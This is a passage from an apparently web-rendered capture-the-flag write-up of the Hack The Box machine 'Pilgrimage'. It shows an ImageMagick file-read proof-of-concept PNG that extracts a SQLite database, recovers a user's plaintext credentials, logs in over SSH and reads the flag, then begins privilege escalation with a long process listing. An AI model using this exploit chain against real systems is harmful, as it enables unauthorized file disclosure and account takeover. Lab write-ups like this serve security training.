</span></span><span style="display:flex;"><span>  $db <span style="color:#f92672">=</span> new PDO<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sqlite:/var/db/pilgrimage&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  $stmt <span style="color:#f92672">=</span> $db-&gt;prepare<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;INSERT INTO `users` (username,password) VALUES (?,?)&#34;</span><span style="color:#f92672">)</span>;
</span></span></code></pre></div><p>Thereby I do the same process of before, but I create the <code>payload</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cp /home/kali/lupin.png  .                                    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 generate.py -f <span style="color:#e6db74">&#34;/var/db/pilgrimage&#34;</span> -o lupin.png   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Generating Blank PNG
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Blank PNG generated
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Placing Payload to read /var/db/pilgrimage
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> PoC PNG generated &gt; lupin.png
</span></span></code></pre></div><p>Now I read the  value within of  <code>Raw profile type</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ identify -verbose 64f8986db8724.png                                     
</span></span><span style="display:flex;"><span>Image: 64f8986db8724.png
</span></span><span style="display:flex;"><span>  Format: PNG <span style="color:#f92672">(</span>Portable Network Graphics<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Geometry: 128x128
</span></span><span style="display:flex;"><span>  Class: DirectClass
</span></span><span style="display:flex;"><span>  Type: true color
</span></span><span style="display:flex;"><span>  Depth: <span style="color:#ae81ff">8</span> bits-per-pixel component
</span></span><span style="display:flex;"><span>  Channel Depths:
</span></span><span style="display:flex;"><span>    Red:      <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>    Green:    <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>    Blue:     <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>  Channel Statistics:
</span></span><span style="display:flex;"><span>    Red:
</span></span><span style="display:flex;"><span>      Minimum:                   257.00 <span style="color:#f92672">(</span>0.0039<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65021.00 <span style="color:#f92672">(</span>0.9922<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    32639.00 <span style="color:#f92672">(</span>0.4980<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      18978.98 <span style="color:#f92672">(</span>0.2896<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Green:
</span></span><span style="display:flex;"><span>      Minimum:                     0.00 <span style="color:#f92672">(</span>0.0000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65278.00 <span style="color:#f92672">(</span>0.9961<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    11062.54 <span style="color:#f92672">(</span>0.1688<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      15530.77 <span style="color:#f92672">(</span>0.2370<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Blue:
</span></span><span style="display:flex;"><span>      Minimum:                   257.00 <span style="color:#f92672">(</span>0.0039<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65021.00 <span style="color:#f92672">(</span>0.9922<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    32639.00 <span style="color:#f92672">(</span>0.4980<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      18978.98 <span style="color:#f92672">(</span>0.2896<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Gamma: 0.45455
</span></span><span style="display:flex;"><span>  Chromaticity:
</span></span><span style="display:flex;"><span>    red primary: <span style="color:#f92672">(</span>0.64,0.33<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    green primary: <span style="color:#f92672">(</span>0.3,0.6<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    blue primary: <span style="color:#f92672">(</span>0.15,0.06<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    white point: <span style="color:#f92672">(</span>0.3127,0.329<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Filesize: 1.5Ki
</span></span><span style="display:flex;"><span>  Interlace: No
</span></span><span style="display:flex;"><span>  Orientation: Unknown
</span></span><span style="display:flex;"><span>  Background Color: white
</span></span><span style="display:flex;"><span>  Border Color: <span style="color:#75715e">#DFDFDF</span>
</span></span><span style="display:flex;"><span>  Matte Color: <span style="color:#75715e">#BDBDBD</span>
</span></span><span style="display:flex;"><span>  Page geometry: 128x128+0+0
</span></span><span style="display:flex;"><span>  Compose: Over
</span></span><span style="display:flex;"><span>  Dispose: Undefined
</span></span><span style="display:flex;"><span>  Iterations: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Compression: Zip
</span></span><span style="display:flex;"><span>  Png:IHDR.color-type-orig: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Png:IHDR.bit-depth-orig: <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>  Raw profile type: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">20480</span>
</span></span><span style="display:flex;"><span>53514c69746520666f726d61742033001000010100402020000000790000000500000000
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000400000004000000000000000000000001000000000000000000000000</span>
</span></span><span style="display:flex;"><span>000000000000000000000000000000000000000000000079002e4b910d0ff800040eba00
</span></span><span style="display:flex;"><span>0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The output It&rsquo;s very big, thereby I use this site <code>https://cyberchef.org/#recipe=From_Hex('Auto')</code> to decode it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>emilyabigchonkyboi123
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Credentials:</p>
<pre tabindex="0"><code>- Username: emily
- Password: abigchonkyboi123
</code></pre><p>I login to ssh like emily and I find the <code>user flag</code>:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ ssh emily@pilgrimage.htb
The authenticity of host &#39;pilgrimage.htb (10.10.11.219)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;pilgrimage.htb&#39; (ED25519) to the list of known hosts.
emily@pilgrimage.htb&#39;s password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep  6 23:01:07 2023 from 10.10.14.48
emily@pilgrimage:~$ ls -all
total 880
drwxr-xr-x 6 emily emily   4096 Sep  6 23:52 .
drwxr-xr-x 3 root  root    4096 Jun  8 00:10 ..
lrwxrwxrwx 1 emily emily      9 Feb 10  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 emily emily    220 Feb 10  2023 .bash_logout
-rw-r--r-- 1 emily emily   3526 Feb 10  2023 .bashrc
-rw-r--r-- 1 emily emily   1678 Sep  6 20:38 binwalk_exploit.png
drwxr-xr-x 3 emily emily   4096 Jun  8 00:10 .config
-rw-r--r-- 1 emily emily     44 Jun  1 19:15 .gitconfig
drwx------ 3 emily emily   4096 Sep  6 23:09 .gnupg
-rwxr-xr-x 1 emily emily 848400 Sep  3 14:30 linpeas.sh
drwxr-xr-x 3 emily emily   4096 Jun  8 00:10 .local
-rw-r--r-- 1 emily emily    807 Feb 10  2023 .profile
drwxr-xr-x 3 emily emily   4096 Sep  7 00:17 r
-rw-r----- 1 root  emily     33 Sep  6 15:42 user.txt
emily@pilgrimage:~$ cat user.txt
61b69e13978210e5a1f080bbea007749
</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I see the <code>processes</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>emily@pilgrimage:/var/lib/sudo/lectured$ ps aux
</span></span><span style="display:flex;"><span>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">1</span>  0.2  0.2  <span style="color:#ae81ff">98260</span> <span style="color:#ae81ff">10008</span> ?        Ss   01:35   0:01 /sbin/init
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>rcu_gp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>rcu_par_gp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kworker/0:0H-events_highpri<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">8</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>rcu_tasks_rude_<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>rcu_tasks_trace<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">11</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">12</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>rcu_sched<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">13</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>migration/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">14</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:35   0:00 <span style="color:#f92672">[</span>kworker/0:1-events<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">15</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>cpuhp/0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">16</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>cpuhp/1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">17</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>migration/1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">18</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>ksoftirqd/1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">20</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kworker/1:0H-events_highpri<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">23</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>kdevtmpfs<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">24</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>netns<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">25</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>kauditd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">27</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>khungtaskd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">28</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>oom_reaper<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">29</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>writeback<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">30</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>kcompactd0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">31</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        SN   01:35   0:00 <span style="color:#f92672">[</span>ksmd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">32</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        SN   01:35   0:00 <span style="color:#f92672">[</span>khugepaged<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">50</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kintegrityd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">51</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kblockd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">52</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>blkcg_punt_bio<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">53</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>edac-poller<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">54</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>devfreq_wq<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">56</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kworker/0:1H-kblockd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">57</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>kswapd0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">58</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kthrotld<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">59</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/24-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">60</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/25-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">61</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/26-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">62</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/27-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">63</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/28-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">64</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/29-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">65</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/30-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">66</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/31-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">67</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/32-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">68</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/33-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">69</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/34-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">70</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/35-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">71</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/36-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">72</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/37-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">73</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/38-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">74</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/39-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">75</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/40-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">76</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/41-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">77</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/42-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">78</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/43-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">79</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/44-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">80</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/45-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">81</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/46-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">82</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/47-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">83</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/48-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">84</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/49-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">85</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/50-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">86</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/51-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">87</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/52-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">88</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/53-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">89</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/54-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">90</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    01:35   0:00 <span style="color:#f92672">[</span>irq/55-pciehp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">91</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>acpi_thermal_pm<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root          <span style="color:#ae81ff">92</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>ipv6_addrconf<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">101</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>kstrp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">104</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   01:35   0:00 <span style="color:#f92672">[</span>zswap-shrink<span style="color:#f92672">]</span>
